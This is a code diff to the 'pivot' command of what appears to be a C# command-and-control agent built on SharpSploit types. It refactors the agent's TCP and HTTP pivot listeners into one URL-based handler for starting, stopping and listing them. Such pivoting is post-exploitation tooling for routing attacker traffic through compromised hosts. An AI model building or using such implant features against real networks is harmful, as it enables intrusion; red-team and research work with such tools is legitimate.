@@ -1,4 +1,5 @@
-﻿using Agent.Models;
+﻿using Agent.Communication;
+using Agent.Models;
 using Agent.Service;
 using System;
 using System.Collections.Generic;
@@ -16,8 +17,6 @@ namespace Agent.Commands
         const string StopVerb = "stop";
         const string ShowVerb = "show";
 
-        const string TcpPivot = "tcp";
-
         public override string Name => "pivot";
 
         public override void InnerExecute(AgentTask task, AgentCommandContext context)
@@ -25,29 +24,19 @@ namespace Agent.Commands
             var pivotService = ServiceProvider.GetService<IPivotService>();
             if (task.SplittedArgs[0] == ShowVerb)
             {
-                if(!pivotService.TCPServers.Any() && !pivotService.HTTPServers.Any())
+                if (!pivotService.Pivots.Any())
                 {
                     context.Result.Result = "No pivots configured!";
                     return;
                 }
 
                 var list = new SharpSploitResultList<ListPivotsResult>();
-                foreach (var pivot in pivotService.TCPServers)
+                foreach (var pivot in pivotService.Pivots)
                 {
                     list.Add(new ListPivotsResult()
                     {
-                        Type = pivot.Type,
-                        BindTo = "0.0.0.0:" + pivot.Port.ToString(),
-                    });
-
-                }
-
-                foreach (var pivot in pivotService.HTTPServers)
-                {
-                    list.Add(new ListPivotsResult()
-                    {
-                        Type = pivot.Type,
-                        BindTo = "0.0.0.0:" + pivot.Port.ToString(),
+                        Type = pivot.Connexion.ProtocolString,
+                        BindTo = pivot.Connexion.ToString(),
                     });
 
                 }
@@ -63,76 +52,43 @@ namespace Agent.Commands
                     pivotService.Start();
                 }
 
-                if (task.SplittedArgs[1].ToLower() == "tcp")
+                var url = task.SplittedArgs[1].ToLower();
+                var conn = ConnexionUrl.FromString(url);
+                if (!conn.IsValid)
                 {
-                    var port = int.Parse(task.SplittedArgs[2]);
-                    if (pivotService.IsPivotRunningOnPort(port))
-                    {
-                        context.Result.Result = $"A pivot is already running on port {port}";
-                        return;
-                    }
-                    pivotService.AddTCPServer(port, false);
-                    context.Result.Result = $"TCP pivot started on port {port}";
+                    context.Result.Result = $"Pivot binding is not valid !";
+                    return;
                 }
 
-                if (task.SplittedArgs[1].ToLower() == "tcps")
+                if (conn.IsSecure && conn.Protocol == ConnexionType.Http)
                 {
-                    var port = int.Parse(task.SplittedArgs[2]);
-                    if (pivotService.IsPivotRunningOnPort(port))
-                    {
-                        context.Result.Result = $"A pivot is already running on port {port}";
-                        return;
-                    }
-                    pivotService.AddTCPServer(port);
-                    context.Result.Result = $"TCPS pivot started on port {port}";
+                    context.Result.Result = $"Pivot Https is not supported !";
+                    return;
                 }
 
-                if (task.SplittedArgs[1].ToLower() == "http")
+
+
+                if(!pivotService.AddPivot(conn))
                 {
-                    var port = int.Parse(task.SplittedArgs[2]);
-                    if (pivotService.IsPivotRunningOnPort(port))
-                    {
-                        context.Result.Result = $"A pivot is already running on port {port}";
-                        return;
-                    }
-                    pivotService.AddHTTPServer(port, false);
-                    context.Result.Result = $"HTTP pivot started on port {port}";
+                    context.Result.Result = $"Cannot start pivot {conn}!";
+                    return;
                 }
 
-                if (task.SplittedArgs[1].ToLower() == "https")
-                {
-                    var port = int.Parse(task.SplittedArgs[2]);
-                    if (pivotService.IsPivotRunningOnPort(port))
-                    {
-                        context.Result.Result = $"A pivot is already running on port {port}";
-                        return;
-                    }
-                    context.Result.Result = $"HTTPS pivot is not supported";
-                }
 
+                context.Result.Result = $"Pivot {conn.ToString()} started";
 
             }
 
             if (task.SplittedArgs[0] == StopVerb)
             {
-                if (task.SplittedArgs[1].ToLower() == "tcp" || task.SplittedArgs[1].ToLower() == "tcps" || task.SplittedArgs[1].ToLower() == "http" || task.SplittedArgs[1].ToLower() == "https")
-                {
-                    var port = int.Parse(task.SplittedArgs[2]);
-                    if (!pivotService.RemoveTCPServer(port))
-                    {
-                        context.Result.Result = $"No pivot is not running on port {port}";
-                        return;
-                    }
-                    else
-                    {
-                        context.Result.Result = $"Pivot stopped on port {port}";
-                    }
-                }
-
-
-                if (!pivotService.HasPivots())
-                    pivotService.Stop();
+                var url = task.SplittedArgs[1].ToLower();
+                var conn = ConnexionUrl.FromString(url);
+                pivotService.RemovePivot(conn);
+                context.Result.Result = $"Pivot {conn} stopped.";
             }
+            
+            if (!pivotService.HasPivots())
+                    pivotService.Stop();
         }
 
 
